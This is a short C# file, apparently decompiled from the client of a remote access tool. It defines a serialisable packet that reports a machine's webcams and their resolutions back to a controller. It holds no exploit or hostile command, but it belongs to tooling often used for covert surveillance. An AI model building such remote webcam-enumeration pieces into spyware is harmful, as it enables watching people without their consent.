using System;
using System.Collections.Generic;
using System.Drawing;

namespace xClient.Core.Packets.ClientPackets;

[Serializable]
public class GetWebcamsResponse : GInterface4
{
	public Dictionary<string, List<Size>> Webcams { get; set; }

	public GetWebcamsResponse()
	{
	}

	public GetWebcamsResponse(Dictionary<string, List<Size>> webcams)
	{
		Webcams = webcams;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
